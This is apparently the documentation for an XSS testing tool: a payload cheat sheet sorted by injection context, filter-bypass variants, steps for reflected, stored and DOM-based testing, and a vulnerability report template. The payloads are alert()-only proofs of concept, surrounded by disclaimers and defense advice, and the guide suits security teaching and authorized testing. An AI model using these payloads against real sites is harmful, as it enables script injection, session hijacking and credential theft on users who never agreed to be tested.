# XSS Testing Guide - For Security Testing Only

## ⚠️ LEGAL DISCLAIMER

**This guide is for AUTHORIZED SECURITY TESTING ONLY.**

Use these payloads ONLY on:
- ✅ Your own applications
- ✅ Authorized penetration testing engagements
- ✅ Bug bounty programs with explicit permission
- ✅ Security research in controlled environments

**DO NOT use for:**
- ❌ Unauthorized access
- ❌ Attacking third-party websites
- ❌ Stealing user data
- ❌ Any illegal activities

---

## 📋 XSS Testing Methodology

### 1. Basic XSS Detection

Test if basic payloads are reflected:

```html
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### 2. Context Testing

Test different contexts where XSS might occur:

#### HTML Context
```html
<div>[USER_INPUT]</div>
Payload: <script>alert(1)</script>
```

#### Attribute Context
```html
<input value="[USER_INPUT]">
Payload: " onload=alert(1) x="
```

#### JavaScript Context
```html
<script>var x = '[USER_INPUT]';</script>
Payload: ';alert(1)//
```

### 3. Filter Bypass Testing

Test common filter bypasses:

```javascript
// Case variation
<ScRiPt>alert(1)</ScRiPt>

// Encoding
&#60;script&#62;alert(1)&#60;/script&#62;

// Attribute-based
<img src=x onerror=alert(1)>

// Event handlers
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
```

---

## 🧪 Testing Payloads by Category

### Image-Based XSS
```html
<img src=x onerror=alert('XSS')>
<img src=x:alert(1) onerror=eval(src)>
<img/src=x onerror=alert(1)>
```

### SVG-Based XSS
```html
<svg onload=alert(1)>
<svg><script>alert(1)</script></svg>
<svg/onload=alert('XSS')>
```

### Event Handler XSS
```html
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
```

### JavaScript Protocol
```html
<a href="javascript:alert(1)">Click</a>
<iframe src="javascript:alert(1)">
```

---

## 🛡️ Testing for Specific Vulnerabilities

### Reflected XSS
User input is immediately reflected in the response.

**Test:**
```
GET /search?q=<script>alert(1)</script>
```

### Stored XSS
User input is stored and displayed to other users.

**Test:**
1. Submit: `<script>alert('Stored XSS')</script>`
2. Check if it persists and executes

### DOM-Based XSS
Vulnerability in client-side JavaScript.

**Test:**
```javascript
// Check if DOM manipulation is vulnerable
document.location.hash = '<img src=x onerror=alert(1)>'
```

---

## 📊 Detection Indicators

### Successful XSS Indicators:
- ✅ Alert box appears
- ✅ Console logs show execution
- ✅ Payload visible in HTML source
- ✅ JavaScript executes in browser context

### Failed XSS Indicators:
- ❌ Payload is HTML encoded
- ❌ Payload is stripped/filtered
- ❌ Script doesn't execute
- ❌ WAF blocks request

---

## 🔧 Testing with This Tool

### Automated Testing

```bash
python main.py

# Select [4] Auto XSS Scanner
# Enter target URL
# Tool will automatically:
# - Test all parameters
# - Try all payloads
# - Use multiple encodings
# - Detect reflections
```

### Manual Testing

1. Enter target URL
2. Select parameter to test
3. Tool injects payloads automatically
4. Review results in report

---

## 📝 Proof of Concept (PoC) Template

When reporting XSS vulnerabilities:

```markdown
## XSS Vulnerability Report

**Type:** Reflected XSS
**Severity:** High
**URL:** http://example.com/search
**Parameter:** q

**Proof of Concept:**
http://example.com/search?q=<script>alert(document.domain)</script>

**Impact:**
- Session hijacking
- Credential theft
- Malicious redirects

**Remediation:**
- Implement proper input validation
- Use output encoding
- Set Content Security Policy
```

---

## ⚙️ Best Practices

### For Testing:
1. ✅ Always get written permission
2. ✅ Test in isolated environments first
3. ✅ Document all findings
4. ✅ Follow responsible disclosure
5. ✅ Use non-destructive payloads

### For Defense:
1. 🛡️ Input validation
2. 🛡️ Output encoding
3. 🛡️ Content Security Policy (CSP)
4. 🛡️ HTTPOnly cookies
5. 🛡️ X-XSS-Protection header

---

## 🚫 What NOT to Do

❌ **Don't:**
- Use real user data in payloads
- Steal credentials or cookies
- Deface websites
- Execute malicious code
- Test without permission
- Share exploits publicly before patch

✅ **Do:**
- Test only authorized targets
- Use alert() or console.log() for PoC
- Report vulnerabilities responsibly
- Help improve security
- Follow ethical guidelines

---

## 📚 Resources

- [OWASP XSS Guide](https://owasp.org/www-community/attacks/xss/)
- [PortSwigger XSS Labs](https://portswigger.net/web-security/cross-site-scripting)
- [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)

---

## 🎯 Safe Testing Targets

Practice XSS on these authorized platforms:
- http://testphp.vulnweb.com
- https://xss-game.appspot.com
- https://portswigger.net/web-security
- https://juice-shop.herokuapp.com

---

**Remember: Use your powers for good, not evil! 🦸‍♂️**

**Report vulnerabilities, don't exploit them.**